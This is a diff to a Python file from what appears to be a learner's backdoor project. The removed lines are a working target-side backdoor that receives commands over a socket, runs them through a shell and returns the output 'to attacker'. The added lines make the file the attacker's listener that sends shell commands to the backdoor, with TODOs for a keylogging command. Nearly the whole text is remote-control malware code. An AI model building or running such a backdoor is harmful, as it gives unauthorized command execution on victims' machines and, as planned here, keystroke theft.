@@ -1,4 +1,6 @@
-#server to be setup on TARGET machine
+#server that sends commands to the backdoor
+#run me first
+#use ctrl+c on my console to close
 import socket
 import json
 import os
@@ -11,22 +13,43 @@ from ctypes.wintypes import INT
 ip = '127.0.0.1'
 port = 4141
 
-client = socket.socket()
+server = socket.socket()
+server.bind((ip, port))
 
-client.connect((ip, port))
-print("connected")
+print('listening For target connection ...')
+server.listen(1)
+client, client_addr = server.accept()
+print(f'[+] {client_addr} connected')
 
-#TODO put getting command in a function (step 3)
+#TODO make and use a function named "target_communication" (step 3)
+#...name doesn't make sense but whatever
 
-# main loop
-while True:
-    #wait for a command from attacker
-    command = client.recv(1024)
-    command = command.decode()
-    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-    output = op.stdout.read()
-    output_error = op.stderr.read()
-    #send response/output back to attacker
-    #print(f"sending: {output.decode() + output_error.decode()}")
-    print(f"sent output from command: {command}")
-    client.send(output + output_error)
+# send commands and receive output in loop
+def target_communication():
+    #count = 0 #why...
+    while True:
+        command = input('* Shell~%s: ' % str(ip))
+        is_quitting = command == 'quit'
+        command = command.encode()
+        client.send(command)
+        output = client.recv(1024)
+        output = output.decode()
+        if is_quitting:
+            break
+        print(f"output: {output}")
+        
+
+target_communication()
+
+#TODO (step 5) make the cd command work basically
+
+#TODO (step 6) "keylog command"
+
+
+# while True:
+#     command = input('enter command: ')
+#     command = command.encode()
+#     client.send(command)
+#     output = client.recv(1024)
+#     output = output.decode()
+#     print(f"output: {output}")
